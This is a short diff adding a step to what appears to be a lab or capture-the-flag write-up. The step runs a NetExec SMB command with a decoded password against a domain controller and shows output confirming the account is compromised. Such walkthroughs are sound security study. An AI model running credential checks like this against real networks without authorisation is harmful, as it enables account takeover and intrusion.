@@ -1129,5 +1129,11 @@ Then ill grep for that specific attribute and add some context, this password is
 At first the password did not work, but throwing it in cyberchef decodes it
 
 ```python
-
+nxc smb dc01.trask.hsm -u b.trask -p 'SentiN3lNow1973#' -k                     
+SMB         dc01.trask.hsm  445    dc01             [*]  x64 (name:dc01) (domain:trask.hsm) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc01.trask.hsm  445    dc01             [+] trask.hsm\b.trask:SentiN3lNow1973#
 ```
+
+This user is compromised!
+
+
